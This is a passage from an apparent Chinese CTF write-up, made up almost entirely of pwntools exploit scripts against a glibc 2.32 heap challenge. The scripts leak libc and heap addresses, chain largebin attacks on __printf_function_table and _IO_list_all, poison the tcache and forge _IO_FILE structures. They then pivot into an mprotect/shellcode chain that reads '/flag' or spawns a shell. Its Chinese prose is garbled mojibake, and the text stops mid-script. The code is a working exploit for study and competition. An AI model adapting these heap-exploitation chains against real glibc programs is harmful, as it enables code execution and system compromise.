<span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Unsorted</span><br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_function_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_function_table)<br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_arginfo_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_arginfo_table)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x388</span> + <span class="hljs-number">0x20</span>,p64(exit))<span class="hljs-comment"># Exit</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                      Largebin Attack _IO_list_all                     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(_IO_list_all - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Largebin Attack main_arena&#x27;s topchunk,Kiwi Preparing.....      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(top_chunk - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Tcache Poisoning,Make up _IO_FILE chain,Pig Preparing.....     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>edit(<span class="hljs-number">0x110</span>,p64(heap_leak^(__malloc_hook)),<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>,p64(magic) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br><br>fuck = SigreturnFrame()<br>fuck.rsp = heap_base + <span class="hljs-number">0xD10</span><br>fuck.rip = ret<br><br>mmp = flat([<br>    rdi,((heap_base + <span class="hljs-number">0xD00</span>)&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span>,rsi,<span class="hljs-number">0x2000</span>,rdx_r12,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,libc.sym.mprotect,rdi,<span class="hljs-number">0</span>,rsi,heap_base + <span class="hljs-number">0xD00</span>,rdx_r12,<span class="hljs-number">0x1000</span>,<span class="hljs-number">0</span>,read_addr,jmp_rsi<br>])<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xA00</span> ,fuck,<span class="hljs-number">0x300</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xD10</span>,mmp,<span class="hljs-number">0x100</span>)<br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span>,payload)<br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>,payload)<br><br><span class="hljs-comment"># ORW                             # rdx</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(heap_base + <span class="hljs-number">0xA00</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>,payload)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Trigger Kiwi --&gt; Husk --&gt; Pig                       |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x1000</span>)<br><span class="hljs-comment"># sl(asm(shellcraft.open(&quot;./&quot;,0x10000) + shellcraft.getdents(&quot;rax&quot;,&quot;rsp&quot;,0x200) + shellcraft.write(1,&quot;rsp&quot;,0x200)))</span><br><span class="hljs-comment"># data0=p.recv(0x200)</span><br><span class="hljs-comment"># print(dirents(data0))</span><br>sl(asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>,<span class="hljs-number">0</span>)+shellcraft.read(<span class="hljs-string">&quot;rax&quot;</span>,<span class="hljs-string">&quot;rsp&quot;</span>,<span class="hljs-number">0x100</span>)+shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;rsp&quot;</span>,<span class="hljs-number">0x100</span>)))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>æ²¡å¼€æ²™ç®±çš„ç›´æ¥æ‹¿ shell ç‰ˆæœ¬ï¼Œè¿™é‡Œæœ‰ç‚¹åƒ 2.24~2.27 é‚£é‡Œçš„ _IO_str_overlow çš„åˆ©ç”¨æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.32/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./des_heap&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./des_heap&#x27;</span>)<br>debug()<br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,27834)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br>    <span class="hljs-comment"># sleep(0.5)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">offset,data,size=<span class="hljs-number">0x1000</span>-<span class="hljs-number">1</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;offset: &#x27;</span>,<span class="hljs-built_in">str</span>(offset))<br>    sla(<span class="hljs-string">&#x27;content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    menu(<span class="hljs-number">4</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                               Init Heap                               |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>add(<span class="hljs-number">0x100</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                 0x100*8 ---&gt; Full Tcache ,Leak libc                   |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    chunk += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br>edit(<span class="hljs-number">0</span>,chunk)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span> + (<span class="hljs-number">7</span>-i)*<span class="hljs-number">0x100</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0xf8</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment"># Bypass \x00 Leak libc</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>) <br>show()<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1e0c75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br>rax = libc_base + <span class="hljs-number">0x0000000000044c70</span><br>rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x0000000000112a51</span><br>syscall_ret = libc_base + <span class="hljs-number">0x000000000006105a</span><br>ret = libc_base + <span class="hljs-number">0x0000000000028a55</span> + <span class="hljs-number">1</span><br>read_addr = libc.sym.read<br>write_addr = libc.sym.write<br>__malloc_hook = libc.sym.__malloc_hook<br>__free_hook = libc.sym.__free_hook<br>system_addr = libc.sym.system<br><span class="hljs-comment"># bin_sh%1 == 1</span><br><span class="hljs-comment"># bin_sh = libc.search(&#x27;/bin/sh&#x27;).next() </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Husk</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>__printf_function_table = libc_base + <span class="hljs-number">0x1e35c8</span><br>__printf_arginfo_table = libc_base + <span class="hljs-number">0x1eb218</span><br>exit = libc.sym.exit<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Pig</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>_IO_list_all = libc_base + <span class="hljs-number">0x1e15c0</span><br>_IO_str_jumps = libc_base + <span class="hljs-number">0x1e2560</span><br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Kiwi</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>top_chunk = libc_base + <span class="hljs-number">0x1e0c00</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                        Leak Heap,Recover Heap                         |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x101</span>)+<span class="hljs-string">&#x27;\x00&#x27;</span>,<span class="hljs-number">0x11</span>) <br>add(<span class="hljs-number">0x58</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>show()<br>ru(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">4</span>))<br>heap_base = heap_leak &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br>add(<span class="hljs-number">0x98</span>) <span class="hljs-comment"># 0xa0 + 0x60 = 0x100 Recover Heap</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Largebin Attack Preparing.....                      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x431</span>) + <span class="hljs-string">&#x27;\0&#x27;</span> * <span class="hljs-number">0x420</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x421</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x410</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span><br>lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(chunk))<br>edit(<span class="hljs-number">0x1000</span>,chunk)<br><br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Largebin</span><br>add(<span class="hljs-number">0x1000</span>)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|   Largebin Attack __printf_function_table&amp;__printf_arginfo_table      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Unsorted</span><br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_function_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_function_table)<br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_arginfo_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_arginfo_table)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x388</span> + <span class="hljs-number">0x20</span>,p64(exit))<span class="hljs-comment"># Exit</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                      Largebin Attack _IO_list_all                     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span 